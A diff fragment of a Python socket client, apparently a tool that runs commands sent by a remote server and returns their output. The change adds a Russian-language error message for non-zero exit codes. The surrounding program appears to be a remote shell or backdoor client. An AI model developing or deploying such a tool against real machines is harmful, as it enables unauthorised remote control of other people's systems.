@@ -38,6 +38,9 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
                 if result.stdout:
                     output += result.stdout
 
+                if result.returncode != 0:
+                    output = f"[x] Выполнение команды завершилось с ошибкой, код: {result.returncode}"
+
                 if not output:
                     output = f'[+] Команда "{server_command}" выполнена успешно'
             except Exception as err:
